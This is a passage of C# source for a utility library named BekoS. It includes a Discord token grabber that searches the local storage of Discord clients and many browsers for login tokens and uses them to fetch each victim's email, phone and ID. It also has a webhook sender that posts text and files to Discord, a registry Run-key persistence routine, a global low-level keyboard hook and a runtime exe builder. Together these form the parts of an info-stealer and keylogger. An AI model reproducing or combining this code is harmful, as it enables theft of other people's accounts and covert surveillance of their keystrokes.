                    object? Item = XmlSerializer.Deserialize(StringReader);

                    return (T?)Item;
                }
                // Deserialize Array
            }
            // If Array

            return (T)Convert.ChangeType(Result, typeof(T));
            // If Not Array
            #endregion
        }

        #endregion

        #region Between As Array

        private static string[] BetweenAsArray(string Text, string First, string Last)
        {
            int count = Text.Split(new string[] { First }, StringSplitOptions.None).Length - 1;

            int searchIndex = 0;
            List<string> list = new List<string>();
            for (int i = 0; i < count; i++)
            {
                int resBas = Text.IndexOf(First, searchIndex) + First.Length;
                int resSon = Text.IndexOf(Last, resBas);

                if (resSon == -1) break;

                list.Add(Text[resBas..resSon]);
                searchIndex = resSon + Last.Length;
            }

            return list.ToArray();
        }

        #endregion

        #region To Title

        private static string ToTitle(string text)
        {
            char[] a = text.ToLower().ToCharArray();

            for (int i = 0; i < a.Length; i++)
            {
                a[i] = i == 0 || new char[] { ' ', '_', '-' }.Contains(a[i - 1]) ? char.ToUpper(a[i]) : a[i];

            }

            return new string(a);
        }

        #endregion

        #endregion

    }
}

#endregion


// Discord.Embed  .AddAttachment
// Discord.Embed  .AddField
// Discord.Embed  Attachment ,, ?? FileInfo.Name

// Constructer to Embed

// Token Object

// Get Discord Account
// Account with pp, name etc..
// Check for Profile 1/2/3/4...

#region => -Discord

namespace BekoS
{
    public static class Discord
    {

        #region Get Current Accounts

        public static Account[] GetCurrentAccounts()
        {
            var discordPaths = new Dictionary<LoggedLocation, string>
            {
                {
                    LoggedLocation.DiscordApplication,
                    "\\Discord\\"
                },
                {
                    LoggedLocation.DiscordCanary,
                    "\\DiscordCanary\\"
                },
                {
                    LoggedLocation.DiscordPTB,
                    "\\DiscordPTB\\"
                },
                {
                    LoggedLocation.Chrome,
                    "\\Google\\Chrome\\"
                },
                {
                    LoggedLocation.ChromeBeta,
                    "\\Google\\Chrome Beta\\"
                },
                {
                    LoggedLocation.ChromeSxS,
                    "\\Google\\Chrome SxS\\"
                },
                {
                    LoggedLocation.FireFox,
                    "\\Mozilla\\Firefox\\Profiles\\"
                },
                {
                    LoggedLocation.Opera,
                    "\\Opera Software\\Opera Stable\\"
                },
                {
                    LoggedLocation.OperaGX,
                    "\\Opera Software\\Opera GX Stable\\"
                },
                {
                    LoggedLocation.Edge,
                    "\\Microsoft\\Edge\\"
                },
                {
                    LoggedLocation.Yandex,
                    "\\Yandex\\YandexBrowser\\"
                },
                {
                    LoggedLocation.Brave,
                    "\\BraveSoftware\\Brave-Browser\\"
                },
                {
                    LoggedLocation.EpicPrivacy,
                    "\\Epic Privacy Browser\\"
                },
                {
                    LoggedLocation.Lightcord,
                    "\\Lightcord\\"
                },
                {
                    LoggedLocation.Amigo,
                    "\\Amigo\\"
                },
                {
                    LoggedLocation.Torch,
                    "\\Torch\\"
                },
                {
                    LoggedLocation.Kometa,
                    "\\Kometa\\"
                },
                {
                    LoggedLocation.Orbitum,
                    "\\Orbitum\\"
                },
                {
                    LoggedLocation.CentBrowser,
                    "\\CentBrowser\\"
                },
                {
                    LoggedLocation.SevenStar,
                    "\\7Star\\7Star\\"
                },
                {
                    LoggedLocation.Sputnik,
                    "\\Sputnik\\Sputnik\\"
                },
                {
                    LoggedLocation.Uran,
                    "\\uCozMedia\\Uran\\"
                },
                {
                    LoggedLocation.Iridium,
                    "\\Iridium\\"
                },
                {
                    LoggedLocation.Vivaldi,
                    "\\Vivaldi\\"
                },
                {
                    LoggedLocation.ThreeHundredSixty,
                    "\\360Browser\\Browser\\"
                },
                {
                    LoggedLocation.CocCoc,
                    "\\CocCoc\\Browser\\"
                },
            };

            List<Account> accounts = new List<Account>();
            foreach (var pair in discordPaths)
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + pair.Value;
                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + pair.Value;

                string[] potentialDiscordPaths =
                {
                    appData,
                    appData + "Default\\",
                    appData + "User Data\\",
                    appData + "User Data\\Default\\",
                    appData + "Login Data\\",
                    localAppData,
                    localAppData + "Default\\",
                    localAppData + "User Data\\",
                    localAppData + "User Data\\Default\\",
                    localAppData + "Login Data\\"
                };

                foreach (string discordPath in potentialDiscordPaths)
                {
                    string discordTokenPath = discordPath + "Local Storage\\leveldb\\";
                    if (!Directory.Exists(discordTokenPath)) continue;

                    foreach (string filePath in Directory.GetFiles(discordTokenPath, "*.ldb"))
                    {
                        try
                        {
                            string fileText = Encoding.UTF8.GetString(File.ReadAllBytes(filePath));

                            if (!fileText.Contains("oken")) continue;

                            Match token = Regex.Match(fileText, @"""([\w-]{24}\.[\w-]{6}\.[\w-]{27})|(mfa\.[\w-]{84})""");
                            if (!token.Success) continue;

                            if (accounts.Exists(a => a.LoggedLocation == pair.Key && a.Token == token.Groups[1].ToString()))
                                continue;

                            Account account = new Account(token.Groups[1].ToString(), pair.Key);
                            accounts.Add(account);
                        }
                        catch { }
                    }
                }
            }

            return accounts.ToArray();
        }

        #endregion


        #region Embed

        public class Embed
        {

            public string BotName { get; set; } = "Webhook Bot";
            public string? Color { get; set; } = null;
            public string? AvatarUrl { get; set; } = null;
            public string? Title { get; set; } = null;
            public int Width { get; set; } = 75;
            public List<string>? Attachments { get; set; } = null;
            public string Content { get; set; } = string.Empty;


            public async void SendToWebhook(string Webhook)
            {

                string zw = "\\u200b";
                string nl = "\\n";
                string tab = zw + " " + zw + " " + zw + " ";


                float titleWidth = string.IsNullOrEmpty(Title) ? 0 : GetStringWidth(Title) / 6;
                int width = Width - titleWidth > 61 ? Convert.ToInt32(61 + titleWidth) : Width;
                int spaceWidth = Convert.ToInt32(width - titleWidth);
                string a = string.Empty; for (int i = 0; i < spaceWidth; i++) { a += zw + " "; }
                string newTitle = a + Title + a;


                string content = Content.Replace(Environment.NewLine, string.Empty);

                int found = Count(content, "field(");
                for (int x = 0; x < found; x++)
                {
                    int index = content.IndexOf("field(");
                    string target = content[index..(content.IndexOf(")field", index) + 6)];

                    index = target.IndexOf("t(");
                    string rawTitles = target[index..(target.IndexOf(")t", index) + 2)].Replace("t(", string.Empty).Replace(")t", string.Empty);
                    string[] titles = rawTitles.Split(new string[] { ",," }, StringSplitOptions.None);

                    index = target.IndexOf("v(");
                    string rawValues = target[index..(target.IndexOf(")v", index) + 2)].Replace("v(", string.Empty).Replace(")v", string.Empty);
                    string[] values = rawValues.Split(new string[] { ",," }, StringSplitOptions.None);

                    int sayi = int.Parse(target.Replace("field(", string.Empty)[..1]);

                    for (int y = 0; y < sayi; y++)
                    {
                        double spacex = (width - 6) / (sayi == 2 ? 2 : sayi * 0.89) - values[y].Length;
                        string space = string.Empty; for (int i = 0; i < spacex; i++) { space += zw + " "; }
                        if (y != sayi - 1) values[y] += space;
                    }

                    string totalTitle = tab; for (int y = 0; y < sayi; y++) { totalTitle += titles[y].Trim(); }
                    double spacex2 = Convert.ToInt32(width - 2 - GetStringWidth(totalTitle) / 7.35) / sayi * (sayi == 2 ? 3.9 : 3.8);
                    string titleSpace = string.Empty; for (int y = 0; y < spacex2; y++) { titleSpace += zw + " "; }


                    string result = nl + tab;
                    for (int y = 0; y < sayi; y++)
                    {
                        result += "**" + titles[y].Trim() + "**";
                        if (y != (sayi - 1)) { result += titleSpace; }
                    }
                    result += "```";
                    for (int y = 0; y < sayi; y++)
                    {
                        result += values[y].Trim();
                    }
                    result += "```";

                    content = content.Replace(target, result);
                }



                string message = @"{

                ""username"": """ + BotName + @""",";

                message += AvatarUrl is not null ? @"""avatar_url"": """ + AvatarUrl + @"""," : string.Empty;

                message += @"""embeds"": 
                [{";
                message += Color is not null ? @"""color"": " + Color + @"," : string.Empty;

                message += newTitle is not null ? @"""title"": """ + zw + @"**" + newTitle + @"**" + zw + @"""," : string.Empty;

                message += @"""description"": """ + zw + content + zw + @"""        
                }]

                }";



                ByteArrayContent jsonMessage = new ByteArrayContent(Encoding.UTF8.GetBytes(message));
                jsonMessage.Headers.ContentType = new MediaTypeHeaderValue("application/json");

                HttpClient httpClient = new HttpClient();
                await httpClient.PostAsync(Webhook, jsonMessage);

                if (Attachments is not null)
                {
                    string[] attachments = Attachments.ToArray();

                    MultipartFormDataContent data = new MultipartFormDataContent
                    {
                        { new StringContent(BotName), "username" },
                        { new StringContent(AvatarUrl!), "avatar_url" }
                    };

                    for (int x = 0; x < attachments.Length; x++)
                    {
                        string[] splited = attachments[x].Split(new string[] { ",," }, StringSplitOptions.None);
                        string file = splited[0].Trim();
                        string name = splited.Length > 1 ? splited[1].Trim() : new FileInfo(file).Name;

                        byte[] byteArray = File.ReadAllBytes(file);
                        ByteArrayContent byteArrayContent = new ByteArrayContent(byteArray);
                        data.Add(byteArrayContent, name, name);
                    }

                    await httpClient.PostAsync(Webhook, data);
                }

            }


        }

        #endregion


        #region Concrete

        public class Account
        {
            public string Token { get; }
            public LoggedLocation LoggedLocation { get; }

            private bool _isTokenValid = true;
            public bool IsTokenValid { get { SetInfos(); return _isTokenValid; } }


            private string? _username;
            public string Username { get { SetInfos(); return _username!; } }

            private string? _discriminator;
            public string Discriminator { get { SetInfos(); return _discriminator!; } }

            private string? _eMail;
            public string EMail { get { SetInfos(); return _eMail!; } }

            private string? _phone;
            public string Phone { get { SetInfos(); return _phone!; } }

            private string? _id;
            public string Id { get { SetInfos(); return _id!; } }

            private string? _avatarUrl;
            public string AvatarUrl { get { SetInfos(); return _avatarUrl!; } }

            private string? _country;
            public string Country { get { SetInfos(); return _country!; } }


            public Account(string token, LoggedLocation loggedLocation)
            {
                Token = token;
                LoggedLocation = loggedLocation;
            }


            private void SetInfos()
            {
                if (_isTokenValid == false || _id is not null) return;

                using HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("Authorization", Token);

                string source;
                try
                {
                    source = httpClient.GetStringAsync("https://discord.com/api/users/@me").Result;
                }
                catch { _isTokenValid = false; return; }

                _username = JsonElement<string>(source, "username");
                _discriminator = JsonElement<string>(source, "discriminator");
                _eMail = JsonElement<string>(source, "email");
                _phone = JsonElement<string>(source, "phone");
                _id = JsonElement<string>(source, "id");
                _avatarUrl = $"https://cdn.discordapp.com/avatars/{_id}/{JsonElement<string>(source, "avatar")}.png";

                _country = new RegionInfo(JsonElement<string>(source, "locale")!).EnglishName;
            }
        }

        public enum LoggedLocation
        {
            DiscordApplication,
            DiscordCanary,
            DiscordPTB,
            Chrome,
            ChromeBeta,
            ChromeSxS,
            FireFox,
            Opera,
            OperaGX,
            Edge,
            Yandex,
            Brave,
            EpicPrivacy,
            Lightcord,
            Amigo,
            Torch,
            Kometa,
            Orbitum,
            CentBrowser,
            SevenStar,
            Sputnik,
            Uran,
            Iridium,
            Vivaldi,
            ThreeHundredSixty,
            CocCoc,
            Other
        }

        #endregion


        #region Utilities

        #region Get String Width

        private static float GetStringWidth(string text, string fonts = "Arial") { return Graphics.FromImage(new Bitmap(1, 1)).MeasureString(text, new Font(fonts, 10.0F)).Width; }

        #endregion

        #region Count

        private static int Count(string text, string Word)
        {
            return text.Split(new string[] { Word }, StringSplitOptions.None).Length - 1;
        }

        #endregion

        #region Json Element

        public static T? JsonElement<T>(string Json, string Element)
        {
            string Result = Json;
            string[] Notation = Element.Split('.');

            #region Methods

            var GetString = new Func<string, char, string>((string JsonValue, char Quote) =>
            {
                return Regex.Match(JsonValue[1..], $@"((\\{Quote})|[^{Quote}])*").Value;
            });

            var GetOther = new Func<string, string>((string JsonValue) =>
            {
                return Regex.Match(JsonValue, @"([\w.,]+)(,?)").Groups[0].Value;
            });

            var GetArray = new Func<string, char, string>((string JsonValue, char OpenBracket) =>
            {
                char Bracket = OpenBracket == '{' ? '}' : ']';
                foreach (char Quote in new char[] { '"', '\'', '`' })
                {
                    MatchCollection Matches = new Regex($@"{Quote}((\\{Quote})|[^{Quote}])*{Quote}").Matches(JsonValue);
                    foreach (Match Match in Matches)
                    {
                        string Found = Match.Value;

                        string Replaced = Found.Replace("S-CloseBracket-S", Bracket.ToString());
                        Replaced = Replaced.Replace(Bracket.ToString(), "S-CloseBracket-S");

                        Replaced = Replaced.Replace("S-OpenBracket-S", OpenBracket.ToString());
                        Replaced = Replaced.Replace(OpenBracket.ToString(), "S-OpenBracket-S");

                        JsonValue = JsonValue.Replace(Found, Replaced);
                    }
                }
                // Change All Brackets In String

                int depth = 1;
                int searchIndex = 0;
                while (true)
                {
                    int indexBracketOpen = JsonValue.IndexOf(OpenBracket, searchIndex + 1);
                    int indexBracketClose = JsonValue.IndexOf(Bracket, searchIndex + 1);
                    depth += indexBracketOpen < indexBracketClose && indexBracketOpen != -1 ? 1 : -1;

                    searchIndex = indexBracketOpen < indexBracketClose && indexBracketOpen != -1 ? indexBracketOpen : indexBracketClose;

                    if (depth == 0) break;
                }
                JsonValue = JsonValue[..(searchIndex + 1)];
                // Calculate Brackets

                JsonValue = JsonValue.Replace("S-CloseBracket-S", Bracket.ToString());
                JsonValue = JsonValue.Replace("S-OpenBracket-S", OpenBracket.ToString());
                // Replace Brackets Back

                return JsonValue;
            });

            #endregion

            for (int Layer = 0; Layer < Notation.Length; Layer++)
            {
                Element = Regex.Match(Result, $@"""{Notation[Layer]}""[\s\n]*:[\s\n]*").Value;
                if (Element == string.Empty) return default;

                string Value = Result[(Result.IndexOf(Element) + Element.Length)..];
                char Type = Value[0];

                // If Element Is  ->  Int | Bool | Null
                if (Char.IsLetterOrDigit(Type)) Result = GetOther(Value);

                // If Element Is  ->  Array  
                else if (Regex.IsMatch(Type.ToString(), @"[{[]")) Result = GetArray(Value, Type);

                // If Element Is  ->  String
                else Result = GetString(Value, Type);
            }

            #region Convert And Return

            if (typeof(T).IsArray)
            {
                Result = Result[1..^1];
                List<string> Items = new List<string>();
                while (true)
                {
                    Result = Result.Trim();
                    if (Result == string.Empty) break;
                    if (Result[0] == ',') Result = Result[1..].Trim();

                    string Item = GetArray(Result, Result[0]);
                    Items.Add(Item);

                    Result = Result[Item.Length..];
                }

                string StartDocument;
                string TypeAlias;
                using (StringWriter StringWriter = new StringWriter())
                {
                    XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));

                    XmlSerializer.Serialize(StringWriter, null);

                    string Serialized = StringWriter.ToString();
                    StartDocument = Serialized[..(Serialized.IndexOf("?>") + 2)];
                    Serialized = Serialized[(Serialized.IndexOf("?>") + 2)..];
                    TypeAlias = Regex.Match(Serialized, @"\b[A-Za-z]+\b", RegexOptions.Singleline).Value;
                }
                // Get TypeAlias

                string ArrayXml = string.Empty;
                Type ItemType = typeof(T).GetElementType()!;
                XmlSerializer ItemSerializer = new XmlSerializer(ItemType);
                foreach (string Item in Items)
                    using (StringWriter StringWriter = new StringWriter())
                    {
                        ItemSerializer.Serialize(StringWriter, Convert.ChangeType(Item, typeof(T).GetElementType()!));

                        string Serialized = StringWriter.ToString();
                        ArrayXml += Serialized[(Serialized.IndexOf("?>") + 2)..];
                    }
                // Serialize Items

                ArrayXml = StartDocument + $"<{TypeAlias}>" + ArrayXml + $"</{TypeAlias}>";
                using (StringReader StringReader = new StringReader(ArrayXml))
                {
                    XmlSerializer XmlSerializer = new XmlSerializer(typeof(T));
                    object? Item = XmlSerializer.Deserialize(StringReader);

                    return (T?)Item;
                }
                // Deserialize Array
            }
            // If Array

            return (T)Convert.ChangeType(Result, typeof(T));
            // If Not Array
            #endregion
        }

        #endregion

        #endregion

    }
}

#endregion


#region => -Country

namespace BekoS
{
    public class Country
    {
        public string CountryName { get; }
        public string CountryCode { get; }
        public string Currency { get; }
        public string CurrencyAbbreviation { get; }
        public string CurrencySymbol { get; }

        public Country(string country)
        {
            RegionInfo cultureInfo = new RegionInfo(country);
            CountryName = cultureInfo.EnglishName;
            CountryCode = cultureInfo.TwoLetterISORegionName;
            Currency = cultureInfo.CurrencyEnglishName;
            CurrencyAbbreviation = cultureInfo.ISOCurrencySymbol;
            CurrencySymbol = cultureInfo.CurrencySymbol;
        }
    }
}

#endregion


// Better build exe ( maybe exebuilder class)
// files, folders list -> io

#region => -IO

namespace BekoS
{
    public static class IO
    {

        #region Paths

        public static class Paths
        {

            public static string Temp() => Path.GetTempPath();

            public static string AppData() => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            public static string LocalAppData() => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        }

        #endregion


        #region Copy()

        public static void Copy(string SourcePath, string DestinationPath)
        {

            DirectoryInfo dir = new DirectoryInfo(SourcePath);

            // File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(SourcePath);
                if (!file.Exists) return;
                string temppath = Path.Combine(DestinationPath, file.Name);
                file.CopyTo(temppath, true);
                return;
            }

            // Directory
            DirectoryInfo[] dirs = dir.GetDirectories();
            Directory.CreateDirectory(DestinationPath);
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(DestinationPath, file.Name);
                file.CopyTo(temppath, true);
            }

            foreach (DirectoryInfo subdir in dirs)
            {
                string temppath = Path.Combine(DestinationPath, subdir.Name);
                Copy(subdir.FullName, temppath);
            }

        }

        #endregion

        #region Move()

        public static void Move(string SourcePath, string DestinationPath)
        {

            DirectoryInfo dir = new DirectoryInfo(SourcePath);

            //File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(SourcePath);
                if (!file.Exists) return;
                string temppath = Path.Combine(DestinationPath, file.Name);
                file.MoveTo(temppath);
                return;
            }

            // Directory
            dir.MoveTo(DestinationPath);

        }

        #endregion

        #region Delete()

        public static void Delete(string Path)
        {
            DirectoryInfo dir = new DirectoryInfo(Path);

            // File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(Path);
                if (!file.Exists) return;
                file.Delete();
            }

            // Directory
            dir.Delete(true);
        }

        #endregion

        #region Exists()

        public static bool Exists(string Path)
        {
            DirectoryInfo dir = new DirectoryInfo(Path);

            // File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(Path);
                return file.Exists;
            }

            // Directory
            return true;

        }

        #endregion



        #region Size()

        public static string? Size(string FilePath, int decimalPlaces)
        {

            // File
            FileInfo file = new FileInfo(FilePath);
            if (!file.Exists) return null;

            long value = file.Length;

            string[] SizeSuffixes = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };

            if (value == 0) { return "0 bytes"; }

            int mag = (int)Math.Log(value, 1024);
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            if (Math.Round(adjustedSize, decimalPlaces) >= 1000)
            {
                mag += 1;
                adjustedSize /= 1024;
            }

            return string.Format("{0:n" + decimalPlaces + "} {1}",
                adjustedSize,
                SizeSuffixes[mag]);

        }

        #endregion

        #region Icon()

        public static Bitmap? Icon(string FilePath)
        {
            // File
            FileInfo file = new FileInfo(FilePath);
            if (!file.Exists) return null;

            return System.Drawing.Icon.ExtractAssociatedIcon(FilePath)?.ToBitmap();
        }

        #endregion

        #region Creation Time()

        public static string CreationTime(string FilePath)
        {
            DirectoryInfo dir = new DirectoryInfo(FilePath);

            // File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(FilePath);
                return file.CreationTime.ToString();
            }

            // Directory
            return dir.CreationTime.ToString();
        }

        #endregion

        #region Last Access Time()

        public static string LastAccessTime(string FilePath)
        {
            DirectoryInfo dir = new DirectoryInfo(FilePath);

            // File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(FilePath);
                return file.LastAccessTime.ToString();
            }

            // Directory
            return dir.LastAccessTime.ToString();
        }

        #endregion

        #region Last Write Time()

        public static string LastWriteTime(string FilePath)
        {
            DirectoryInfo dir = new DirectoryInfo(FilePath);

            // File
            if (!dir.Exists)
            {
                FileInfo file = new FileInfo(FilePath);
                return file.LastWriteTime.ToString();
            }

            // Directory
            return dir.LastWriteTime.ToString();
        }

        #endregion



        #region Create

        public static class Create
        {

            public static void File(string Path, string Content = "")
            {
                System.IO.File.WriteAllText(Path, Content);
            }

            public static void Directory(string Path)
            {
                System.IO.Directory.CreateDirectory(Path);
            }

        }

        #endregion

        #region Append()

        public static void Append(string FilePath, string Content, bool NewLine = true)
        {
            if (!File.Exists(FilePath)) return;

            File.AppendAllText(FilePath, NewLine ? Environment.NewLine + Content : Content);
        }

        #endregion



        #region Build Exe()

        public static void BuildExe(string DefaultName, string Code, string IconPath = "", string[]? DllReferences = null, string Filter = "Exe File")
        {

            SaveFileDialog sfd = new SaveFileDialog
            {
                FileName = DefaultName.Replace(".exe", string.Empty),
                Filter = Filter.Replace("|*.exe", string.Empty).Replace(".exe", "").Trim() + "|*.exe"
            };

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                string name = sfd.FileName.Replace(".exe", string.Empty).Trim() + ".exe";

                string[] defaultReferences = { "Microsoft.VisualBasic.dll", "System.dll", "System.Configuration.dll", "System.Web.Extensions.dll",
                "System.Windows.Forms.dll", "System.Net.dll", "System.Drawing.dll", "System.Management.dll", "System.IO.dll","System.IO.compression.dll",
                "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Core.dll", "System.Security.dll",
                "mscorlib.dll", "System.Globalization.dll", "System.Reflection.dll", "System.Net.Http.dll" };

                CompilerParameters parameters = new CompilerParameters(DllReferences ?? defaultReferences, name)
                {
                    GenerateExecutable = true,
                    OutputAssembly = name,
                    GenerateInMemory = false,
                    TreatWarningsAsErrors = false,
                };

                parameters.CompilerOptions += "/t:winexe /unsafe /platform:x86";
                if (IconPath != string.Empty) { parameters.CompilerOptions += " /win32icon:" + @"""" + IconPath + @""""; }

                CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
                CompilerResults results = provider.CompileAssemblyFromSource(parameters, Code);


                if (results.Errors.Count != 0)
                {
                    foreach (CompilerError error in results.Errors)
                        MessageBox.Show(error.ErrorText);
                }

            }

        }

        #endregion

    }
}

#endregion


#region => -Startup

namespace BekoS
{
    public static class StartUp
    {

        public static void Add()
        {
            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)
            ?.SetValue(Assembly.GetExecutingAssembly().GetName().Name, "\"" + Assembly.GetExecutingAssembly().Location + "\"");

        }

        public static void Remove()
        {
            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)
            ?.DeleteValue(Assembly.GetExecutingAssembly().GetName().Name!, false);
        }

    }
}

#endregion


// Keyboard Type, Type to specific window... 7(Keyboard.Typer)
// e.Handled doesnt work
// test local hook, caps lock etc..
// window to global hook event args inherited from normal, time prop to all
// globalde vs. gereksiz prop yerine local variable da tut

#region => -Keyboard

namespace BekoS
{
    public static class Keyboard
    {

        #region Hook

        public static class Hook
        {
            static Hook() => SetupKeys();

            #region Local

            public class Local : IDisposable
            {
                public event Action<EventArgs>? KeyDown;
                public event Action<EventArgs>? KeyUp;

                private Control Control { get; set; }
                public Local(Control Control)
                {
                    this.Control = Control;
                    OtherKeys = new List<Keys>();

                    Control.KeyDown += Control_KeyDown;
                    Control.KeyUp += Control_KeyUp;
                }

                public void Dispose()
                {
                    Control.KeyDown -= Control_KeyDown;
                    Control.KeyUp -= Control_KeyUp;
                }

                private List<Keys> OtherKeys { get; set; }
                private async void Control_KeyDown(object? sender, KeyEventArgs e)
                {
                    bool AltGr = e.Alt && e.Control;
                    CapsLock = Control.IsKeyLocked(Keys.Capital) || Control.IsKeyLocked(Keys.CapsLock);
                    NumLock = Control.IsKeyLocked(Keys.NumLock);

                    bool isSpecial = e.Control || e.Shift || e.Alt || AltGr;
                    Keys key = (Keys)e.KeyValue;

                    if (key == Keys.CapsLock || key == Keys.Capital)
                        CapsLock = !CapsLock;

                    if (key == Keys.NumLock)
                        NumLock = !NumLock;

                    if (!isSpecial && OtherKeys.Contains(key)) OtherKeys.RemoveAt(Array.IndexOf(OtherKeys.ToArray(), key));
                    // Remove Key From List

                    string? keyText = await GetKeyTextAsync(key, e.Shift, e.Control, e.Alt, AltGr, CapsLock);

                    EventArgs eventArguments = new EventArgs(e.KeyValue, e.Shift, e.Control, e.Alt, AltGr, CapsLock, NumLock, OtherKeys, keyText);
                    KeyDown?.Invoke(eventArguments);

                    if (!isSpecial && !OtherKeys.Contains(key)) OtherKeys.Add(key);
                    // ReAdd Key To List If Key Down
                }

                private bool CapsLock { get; set; }
                private bool NumLock { get; set; }
                private async void Control_KeyUp(object? sender, KeyEventArgs e)
                {
                    bool AltGr = e.Alt && e.Control;

                    bool isSpecial = e.Control || e.Shift || e.Alt;
                    Keys key = (Keys)e.KeyValue;

                    if (!isSpecial && OtherKeys.Contains(key)) OtherKeys.RemoveAt(Array.IndexOf(OtherKeys.ToArray(), key));
                    // Remove Key From List

                    string? keyText = await GetKeyTextAsync(key, e.Shift, e.Control, e.Alt, AltGr, CapsLock);

                    EventArgs eventArguments = new EventArgs(e.KeyValue, e.Shift, e.Control, e.Alt, AltGr, CapsLock, NumLock, OtherKeys, keyText);
                    KeyUp?.Invoke(eventArguments);
                }
            }

            #endregion

            #region Global

            public class Global : IDisposable
            {
                public event Action<EventArgs>? KeyDown;
                public event Action<EventArgs>? KeyUp;

                public Global()
                {
                    _windowsHookHandle = IntPtr.Zero;
                    _user32LibraryHandle = IntPtr.Zero;
                    _hookProc = LowLevelKeyboardProcAsync;
                    OtherKeys = new List<Keys>();
                    CapsLock = System.Windows.Forms.Control.IsKeyLocked(Keys.Capital)
                        || System.Windows.Forms.Control.IsKeyLocked(Keys.CapsLock);
                    NumLock = System.Windows.Forms.Control.IsKeyLocked(Keys.NumLock);

                    _user32LibraryHandle = LoadLibrary("User32");
                    if (_user32LibraryHandle == IntPtr.Zero)
                    {
                        int errorCode = Marshal.GetLastWin32Error();
                        throw new Win32Exception(errorCode, $"Failed to load library 'User32.dll'. Error {errorCode}: {new Win32Exception(Marshal.GetLastWin32Error()).Message}.");
                    }

                    _windowsHookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, _user32LibraryHandle, 0);
                    if (_windowsHookHandle == IntPtr.Zero)
                    {
                        int errorCode = Marshal.GetLastWin32Error();
                        throw new Win32Exception(errorCode, $"Failed to adjust keyboard hooks for '{Process.GetCurrentProcess().ProcessName}'. Error {errorCode}: {new Win32Exception(Marshal.GetLastWin32Error()).Message}.");
                    }
                }

                public void Dispose()
                {
                    if (_windowsHookHandle != IntPtr.Zero)
                    {
                        if (!UnhookWindowsHookEx(_windowsHookHandle))
                        {
                            int errorCode = Marshal.GetLastWin32Error();
                            throw new Win32Exception(errorCode, $"Failed to remove keyboard hooks for '{Process.GetCurrentProcess().ProcessName}'. Error {errorCode}: {new Win32Exception(Marshal.GetLastWin32Error()).Message}.");
                        }
                        _windowsHookHandle = IntPtr.Zero;

                        _hookProc -= LowLevelKeyboardProcAsync;
                    }

                    if (_user32LibraryHandle != IntPtr.Zero)
                    {
                        if (!FreeLibrary(_user32LibraryHandle))
                        {
                            int errorCode = Marshal.GetLastWin32Error();
                            throw new Win32Exception(errorCode, $"Failed to unload library 'User32.dll'. Error {errorCode}: {new Win32Exception(Marshal.GetLastWin32Error()).Message}.");
                        }
                        _user32LibraryHandle = IntPtr.Zero;
                    }

                    GC.SuppressFinalize(this);
                }



                private IntPtr _windowsHookHandle;
                private IntPtr _user32LibraryHandle;
                private HookProc? _hookProc;

                delegate Task<IntPtr> HookProc(int nCode, IntPtr wParam, IntPtr lParam);

                [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
                private static extern IntPtr LoadLibrary(string lpFileName);

                [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
                private static extern bool FreeLibrary(IntPtr hModule);

                [DllImport("USER32", SetLastError = true)]
                private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, int dwThreadId);

                [DllImport("USER32", SetLastError = true)]
                private static extern bool UnhookWindowsHookEx(IntPtr hHook);

                [DllImport("USER32", SetLastError = true)]
                private static extern IntPtr CallNextHookEx(IntPtr hHook, int code, IntPtr wParam, IntPtr lParam);

                [StructLayout(LayoutKind.Sequential)]
                private struct LowLevelKeyboardInputEvent
                {
                    public int VirtualCode;
                    public int HardwareScanCode;
                    public int Flags;
                    public int TimeStamp;
                    public IntPtr AdditionalInformation;
                }

                private const int WH_KEYBOARD_LL = 13;

                private enum KeyboardState
                {
                    KeyDown = 0x0100,
                    KeyUp = 0x0101,
                    SysKeyDown = 0x0104,
                    SysKeyUp = 0x0105
                }

                private bool Control { get; set; }
                private bool Shift { get; set; }
                private bool Alt { get; set; }
                private bool AltGr { get; set; }
                private bool CapsLock { get; set; }
                private bool NumLock { get; set; }
                private List<Keys> OtherKeys { get; set; }
                private async Task<IntPtr> LowLevelKeyboardProcAsync(int nCode, IntPtr wParam, IntPtr lParam)
                {
                    bool fEatKeyStroke = false;

                    var wparamTyped = wParam.ToInt32();
                    if (Enum.IsDefined(typeof(KeyboardState), wparamTyped))
                    {
                        object o = Marshal.PtrToStructure(lParam, typeof(LowLevelKeyboardInputEvent))!;
                        LowLevelKeyboardInputEvent p = (LowLevelKeyboardInputEvent)o;


                        bool isDown = (KeyboardState)wparamTyped == KeyboardState.KeyDown ||
                           (KeyboardState)wparamTyped == KeyboardState.SysKeyDown;
                        // Down Or Up

                        Keys key = (Keys)p.VirtualCode;
                        // Key


                        if (key == Keys.Shift || key == Keys.ShiftKey || key == Keys.LShiftKey || key == Keys.RShiftKey)
                            Shift = isDown;

                        else if (key == Keys.Control || key == Keys.ControlKey || key == Keys.LControlKey || key == Keys.RControlKey)
                            Control = isDown;

                        else if (key == Keys.Alt || key == Keys.Menu || key == Keys.LMenu || key == Keys.RMenu)
                            Alt = isDown;

                        else if (isDown && (key == Keys.CapsLock || key == Keys.Capital))
                            CapsLock = !CapsLock;

                        else if (isDown && key == Keys.NumLock)
                            NumLock = !NumLock;

                        AltGr = Control && Alt;

